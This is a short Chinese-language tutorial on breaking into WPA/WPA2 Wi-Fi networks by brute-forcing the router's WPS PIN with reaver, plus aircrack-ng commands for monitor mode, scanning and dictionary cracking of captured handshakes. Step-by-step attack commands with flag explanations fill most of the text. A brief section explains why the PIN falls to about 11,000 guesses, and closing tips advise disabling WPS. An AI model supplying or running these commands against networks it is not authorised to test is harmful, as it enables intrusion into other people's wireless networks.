前期工作
====================
安装reaver 1.4：
下载：
[url]http://code.google.com/p/reaver-wps/downloads/list[/url]
安装：
./configure
make
sudo make install

安装aircrack-ng：
sudo apt-get install aircrack-ng


破解操作
====================
sudo airmon-ng start wlan0 (启动无线网卡的监控模式)(启动监控模式后接口是mon0)
sudo wash -i mon0 --scan (搜索开启WPS的AP)
sudo reaver -i mon0 -a -S -N -d 0 -t 5 -vv -b MAC -c Channel (进行pin破解)
参数简要说明：
-d 间隔时间
-vv 详细信息
-v 简单信息
-a 自动接上原来的进度
-S 优化PIN码
-N 关闭NACK
-t 超时 时间
-c 指定信道
-p 指定pin码
-b 目标MAC
sudo airmon-ng stop mon0 (破解完成后关闭监控模式)


其他命令
====================
sudo airodump-ng mon0
查看无线AP
aircrack-ng -w 字典文件名 握手包文件名
跑包
sudo airodump-ng mon0 -d MAC -c  Channel
调天线


破解原理
====================
WPA/WPA2加密理论上不能破解，而reaver的pin破解是针对无线路由的WPS漏洞。
WPS功能是无线路由上一串8位数字组合的pin码，用于快速连接WIFI。
而8位数字的组合分为前四位和后三位，加一位校验码。
所以前四位组合10000个，后三位组合1000个，共11000个pin码。
通过逐一尝试得出前四位后，再尝试后三位，最后得到正确ping码，并连接取得WPA/WPA2密码。


反破解建议
====================
路由的WPS功能是可以关闭的，登录路由器关闭此功能即可。
建议更改路由器的默认登录密码，因为除了pin破解外还有抓包破解等其他方法。
当发现无线密码可能被破解后，迅速更改无线密码。